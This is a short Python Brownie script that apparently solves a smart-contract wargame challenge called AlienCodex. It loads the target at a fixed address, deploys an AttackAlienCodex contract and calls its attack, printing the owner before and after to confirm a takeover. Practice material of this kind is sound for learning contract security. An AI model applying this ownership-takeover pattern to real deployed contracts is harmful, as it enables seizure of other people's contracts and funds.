from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import AlienCodex, AttackAlienCodex, network, Contract
from web3 import Web3
from web3.auto import w3


def deploy_AlienCodex():
    acc1 = get_account(index=1)
    codex = AlienCodex.deploy(
        {"from": acc1},
    )
    return codex


def deploy_AttackAlienCodex(codex):
    account = get_account()
    attack_contract = AttackAlienCodex.deploy(
        codex,
        {"from": account},
    )
    return attack_contract


def main():
    print(network.show_active())
    print(get_account(index=1))
    print(get_account())
    account = get_account()

    # codex = deploy_AlienCodex()
    codex_address = "0x2e67A06f07FE737f5daEFE37D8609FF56760f35e"
    codex = Contract.from_abi(AlienCodex._name, codex_address, AlienCodex.abi)

    attack_contract = deploy_AttackAlienCodex(codex)

    print(f"Owner? : {codex.owner()}")

    attack_contract.attack({"from": account})

    print(f"Owner? : {codex.owner()}")
